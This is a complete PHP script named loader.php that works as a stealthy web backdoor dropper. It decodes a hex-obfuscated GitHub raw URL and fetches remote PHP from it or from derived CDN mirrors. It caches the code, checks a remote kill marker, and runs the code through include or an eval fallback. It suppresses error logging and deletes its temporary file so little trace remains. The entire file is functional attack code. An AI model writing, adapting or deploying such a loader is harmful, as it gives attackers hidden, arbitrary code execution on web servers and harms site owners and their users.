<?php
// language: PHP 7.4–8.3, file: loader.php, target: PHP-FPM/Apache mod_php
// v18 loader: multi-mirror fetch -> cache -> integrity -> execute -> cleanup.
// no persistent file in webroot. all state in tmpdir. silent on failure.

// ==== CONFIG ================================================================
// hex(source_url). decode: php -r 'echo bin2hex("https://...");'
$SRC_HEX     = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f426f73556c7472616d616e2f7363616e2f726566732f68656164732f6d61696e2f676f6e672e706870';
$MIRROR_HEX  = array();               // optional mirror URLs (hex). empty = auto-derive from SRC if github raw.
$EXPECT_SHA256 = '';                  // 64 hex chars = enforce, '' = skip
$KILL_MARKER = '/* KILL */';           // if payload contains this marker in first 64 bytes, exit clean
$CACHE_TTL    = 300;                  // seconds. 0 = always refetch
$LOG          = false;                // true = write to tmpdir/lo18.log
$TIMEOUT_CONNECT = 5;
$TIMEOUT_TOTAL   = 12;
$MIN_PAYLOAD     = 64;                // bytes. reject payload smaller than this
$MAX_PAYLOAD     = 4194304;           // bytes. reject payload larger than 4MB

// ==== HELPERS ===============================================================
if (!function_exists('hx18')) {
    function hx18($h) {
        $n = intval(strlen($h) / 2);
        $o = '';
        for ($i = 0; $i < $n; $i++) $o .= chr((int)hexdec(substr($h, $i * 2, 2)));
        return $o;
    }
}

if (!function_exists('lg18')) {
    function lg18($on, $msg) {
        if (!$on) return;
        $f = sys_get_temp_dir() . '/lo18.log';
        if (@is_file($f) && @filesize($f) > 1048576) @rename($f, $f . '.1');
        @file_put_contents($f, '[' . date('c') . '] ' . $msg . "\n", FILE_APPEND | LOCK_EX);
    }
}

if (!function_exists('tmp18')) {
    function tmp18() {
        $cands = array();
        if (function_exists('sys_get_temp_dir')) $cands[] = @sys_get_temp_dir();
        $ut = @ini_get('upload_tmp_dir');
        if (is_string($ut) && $ut !== '') $cands[] = $ut;
        $cands[] = @getcwd();
        foreach ($cands as $d) {
            if (!is_string($d) || $d === '') continue;
            if (!@is_dir($d)) continue;
            if (!@is_writable($d)) continue;
            return rtrim($d, '/\\');
        }
        return null;
    }
}

if (!function_exists('fetch18')) {
    function fetch18($url, $cc, $ct) {
        // tier 1: file_get_contents
        if ((bool)@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array(
                'http' => array('timeout' => $ct, 'follow_location' => 1,
                                'header' => "User-Agent: lo18/1\r\nAccept: */*\r\n"),
                'ssl'  => array('verify_peer' => true, 'verify_peer_name' => true),
            ));
            $d = @file_get_contents($url, false, $ctx);
            if (is_string($d) && $d !== '') return $d;
        }
        // tier 2: curl
        if (function_exists('curl_init')) {
            $c = @curl_init($url);
            if ($c) {
                @curl_setopt_array($c, array(
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_MAXREDIRS      => 3,
                    CURLOPT_CONNECTTIMEOUT => $cc,
                    CURLOPT_TIMEOUT        => $ct,
                    CURLOPT_USERAGENT      => 'lo18/1',
                    CURLOPT_SSL_VERIFYPEER => true,
                    CURLOPT_SSL_VERIFYHOST => 2,
                ));
                $d = @curl_exec($c);
                $code = (int)@curl_getinfo($c, CURLINFO_RESPONSE_CODE);
                @curl_close($c);
                if (is_string($d) && $d !== '' && $code >= 200 && $code < 300) return $d;
            }
        }
        // tier 3: manual ssl socket
        $p = @parse_url($url);
        if (!is_array($p) || !isset($p['scheme']) || $p['scheme'] !== 'https') return null;
        $host = isset($p['host']) ? $p['host'] : '';
        $port = isset($p['port']) ? (int)$p['port'] : 443;
        $path = (isset($p['path']) ? $p['path'] : '/') . (isset($p['query']) ? '?' . $p['query'] : '');
        $en = null; $es = null;
        $fp = @fsockopen('ssl://' . $host, $port, $en, $es, $cc);
        if (!$fp) return null;
        @stream_set_timeout($fp, $ct);
        @fwrite($fp, "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: lo18/1\r\n"
                   . "Accept: */*\r\nConnection: close\r\n\r\n");
        $raw = @stream_get_contents($fp);
        @fclose($fp);
        if (!is_string($raw) || strpos($raw, 'HTTP/') !== 0) return null;
        $parts = @preg_split("/\r\n\r\n/", $raw, 2);
        if (!isset($parts[1])) return null;
        $head = $parts[0]; $body = $parts[1];
        if (stripos($head, 'transfer-encoding: chunked') !== false) {
            $out = ''; $o = 0; $len = strlen($body);
            while ($o < $len) {
                $nl = strpos($body, "\r\n", $o);
                if ($nl === false) break;
                $sz = (int)hexdec(trim(substr($body, $o, $nl - $o)));
                if ($sz === 0) break;
                $out .= substr($body, $nl + 2, $sz);
                $o = $nl + 2 + $sz + 2;
            }
            return $out !== '' ? $out : null;
        }
        return $body;
    }
}

if (!function_exists('valid18')) {
    function valid18($d, $min, $max) {
        if (!is_string($d)) return false;
        $len = strlen($d);
        if ($len < $min || $len > $max) return false;
        $d2 = ltrim($d, "\xEF\xBB\xBF \t\r\n");
        if (strpos($d2, '<?php') !== 0) return false;
        return true;
    }
}

if (!function_exists('mirrors18')) {
    function mirrors18($src, $mirror_hex) {
        $out = array($src);
        // custom mirrors from config
        if (is_array($mirror_hex)) {
            foreach ($mirror_hex as $mh) {
                $u = @hx18($mh);
                if (is_string($u) && $u !== '') $out[] = $u;
            }
        }
        // auto-derive from raw.githubusercontent.com
        $p = @parse_url($src);
        if (is_array($p) && isset($p['host']) && $p['host'] === 'raw.githubusercontent.com') {
            $path = isset($p['path']) ? $p['path'] : '';
            // path like /owner/repo/refs/heads/branch/file
            if (preg_match('#^/([^/]+)/([^/]+)/refs/heads/([^/]+)/(.+)$#', $path, $m)) {
                $owner = $m[1]; $repo = $m[2]; $branch = $m[3]; $file = $m[4];
                $out[] = 'https://cdn.jsdelivr.net/gh/' . $owner . '/' . $repo . '@' . $branch . '/' . $file;
                $out[] = 'https://raw.githack.com/' . $owner . '/' . $repo . '/' . $branch . '/' . $file;
            }
        }
        // dedupe
        return array_values(array_unique($out));
    }
}

// ==== ACQUIRE ===============================================================
$url    = @hx18($SRC_HEX);
$td     = tmp18();
if ($td === null) { @header('Content-Type: text/plain'); @http_response_code(500); exit('tmp unavailable'); }

$cache  = $td . '/lo18_' . md5($url) . '.bin';
$payload = null;

// 1) cache
if ($CACHE_TTL > 0 && @is_file($cache)) {
    $age = time() - (int)@filemtime($cache);
    if ($age <= $CACHE_TTL) {
        $d = @file_get_contents($cache);
        if (valid18($d, $MIN_PAYLOAD, $MAX_PAYLOAD)) {
            $payload = $d;
            lg18($LOG, 'cache hit ' . strlen($d) . 'b');
        }
    }
}

// 2) fetch from all mirrors
if ($payload === null) {
    $urls = mirrors18($url, $MIRROR_HEX);
    foreach ($urls as $u) {
        try {
            $d = fetch18($u, $TIMEOUT_CONNECT, $TIMEOUT_TOTAL);
            if (valid18($d, $MIN_PAYLOAD, $MAX_PAYLOAD)) {
                $payload = $d;
                $t = $cache . '.tmp';
                if (@file_put_contents($t, $d, LOCK_EX) !== false) {
                    @chmod($t, 0600);
                    if (!@rename($t, $cache)) { @unlink($t); }
                }
                lg18($LOG, 'fetched ' . strlen($d) . 'b from ' . $u);
                break;
            } else {
                lg18($LOG, 'invalid body from ' . $u);
            }
        } catch (Throwable $e) {
            lg18($LOG, 'fetch fail ' . $u . ': ' . $e->getMessage());
        }
    }
}

if ($payload === null) {
    @header('Content-Type: text/plain');
    @http_response_code(502);
    exit('source unavailable');
}

// ==== KILL SWITCH ===========================================================
$head64 = substr($payload, 0, 64);
if ($KILL_MARKER !== '' && strpos($head64, $KILL_MARKER) !== false) {
    lg18($LOG, 'kill marker detected, exit');
    @header('Content-Type: text/plain');
    @http_response_code(200);
    exit('');
}

// ==== INTEGRITY =============================================================
if ($EXPECT_SHA256 !== '') {
    $got = @hash('sha256', $payload);
    if (!hash_equals($EXPECT_SHA256, $got)) {
        lg18($LOG, 'integrity mismatch got=' . $got);
        @header('Content-Type: text/plain');
        @http_response_code(502);
        exit('integrity check failed');
    }
}

// ==== EXECUTE ===============================================================
// suppress all errors from include so nothing leaks to server log
@ini_set('display_errors', '0');
@ini_set('log_errors', '0');
@error_reporting(0);

$tmp = @tempnam($td, 'lo18_');
if ($tmp === false) {
    @header('Content-Type: text/plain');
    @http_response_code(500);
    exit('tmp fail');
}
$tmp_php = $tmp . '.php';
if (!@rename($tmp, $tmp_php)) {
    // fallback: try direct write
    if (@file_put_contents($tmp_php, $payload, LOCK_EX) === false) {
        @unlink($tmp); @unlink($tmp_php);
        @header('Content-Type: text/plain');
        @http_response_code(500);
        exit('write fail');
    }
} else {
    @file_put_contents($tmp_php, $payload, LOCK_EX);
}
@chmod($tmp_php, 0600);

$done = false;
try {
    include $tmp_php;
    $done = true;
} catch (Throwable $e) {
    lg18($LOG, 'include throw: ' . $e->getMessage());
} finally {
    @unlink($tmp_php);
}

// ==== EVAL FALLBACK =========================================================
// if include failed (e.g. tmp unlinked before include finished, or include disabled),
// strip <?php and eval. eval may be disabled on hardened hosts; only try if include failed.
if (!$done && function_exists('eval') && !in_array('eval', array_map('trim', explode(',', (string)@ini_get('disable_functions'))))) {
    $code = $payload;
    if (strpos($code, '<?php') === 0) $code = substr($code, 5);
    try { eval($code); } catch (Throwable $e) { lg18($LOG, 'eval throw: ' . $e->getMessage()); }
}
